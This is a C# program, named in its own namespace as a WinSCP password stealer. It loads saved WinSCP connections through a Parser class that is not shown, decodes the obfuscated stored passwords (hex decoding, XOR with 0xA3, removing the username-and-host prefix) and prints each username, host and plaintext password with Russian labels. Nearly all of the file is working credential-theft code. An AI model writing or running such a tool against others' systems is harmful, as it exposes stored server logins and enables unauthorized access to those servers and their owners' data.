using System.Data.SqlTypes;
using System.Runtime.CompilerServices;
using System.Text;
using static WSCPPasswordStealler.Parser;


namespace WSCPPasswordStealler
{
    internal class Root
    {
        static void Main(string[] args)
        {
            Parser p = new Parser();
            List<Connection> connections = p.ParserConnections("");
            foreach(Connection c in connections)
            {
                
                byte[] pwd = Encoding.ASCII.GetBytes(c._password);
                Decryptor dec = new Decryptor(pwd, c._username, c._host);
                string res = dec.DecryptPassword();
                Console.WriteLine($"Имя пользователя: {c._username} \n IP-адрес: {c._host} \n Пароль: {res} \n ");
            }

        }
    }

    public static class PwAlg
    {
        public const byte PWALG_SIMPLE_INTERNAL = 0x00;
        public const byte PWALG_SIMPLE_EXTERNAL = 0x01;
        public const byte PWALG_SIMPLE_INTERNAL2 = 0x02;
        public const byte PWALG_SIMPLE_MAGIC = 0xA3;
        public const byte PWALG_SIMPLE_FLAG = 0xFF;
   
        public static readonly byte[] PWALG_SIMPLE_BYTES = Encoding.ASCII.GetBytes("0123456789ABCDEF");
    }

    public class Decryptor
    {
        private byte[] _strBytes;
        private string _username;
        private string _host;
        public Decryptor(byte[] strBytes, string username, string host)
        {
            _strBytes = strBytes;
            _username = username;
            _host = host;
        }

        private int offset;
        public byte SimpleDecryptNextChar()
        {
            if (_strBytes.Length - offset < 2)
                throw new ArgumentException("Byte array too short");

            int pos1 = Array.IndexOf(PwAlg.PWALG_SIMPLE_BYTES, _strBytes[offset]);
            int pos2 = Array.IndexOf(PwAlg.PWALG_SIMPLE_BYTES, _strBytes[offset + 1]);
            if (pos1 < 0 || pos2 < 0)
                throw new ArgumentException("Invalid characters in byte array");

            int n = pos1 << 4 | pos2;           
            byte result = (byte)(~(n ^ PwAlg.PWALG_SIMPLE_MAGIC) & 0xFF);

            offset += 2;
          
            return result;
        }


        public string DecryptPassword()
        {
 
            byte flag = SimpleDecryptNextChar();
            int length;
            if (flag == PwAlg.PWALG_SIMPLE_FLAG)
            {
                byte version = SimpleDecryptNextChar();
                if (version == PwAlg.PWALG_SIMPLE_INTERNAL)
                {
                    length = SimpleDecryptNextChar();
                }
                else if (version == PwAlg.PWALG_SIMPLE_INTERNAL2)
                {
                    int hi = SimpleDecryptNextChar();
                    int lo = SimpleDecryptNextChar();
                    length = hi << 8 | lo;
                }
                else
                {
             
                    length = -1;
                }
            }
            else
            {
                length = flag;
            }

            if (length < 0)
                return string.Empty;

        
            int toBeDeleted = SimpleDecryptNextChar(); 
            offset += toBeDeleted * 2;               

       
            var payload = new byte[length];
            for (int i = 0; i < length; i++)
                payload[i] = SimpleDecryptNextChar();

       
            string result = Encoding.UTF8.GetString(payload);

         
            if (flag == PwAlg.PWALG_SIMPLE_FLAG)
            {
                string key = _username + _host; 
                if (result.StartsWith(key, StringComparison.Ordinal))
                    result = result.Substring(key.Length);
                else
                    result = string.Empty; 
            }

            return result;
        }
    }
}
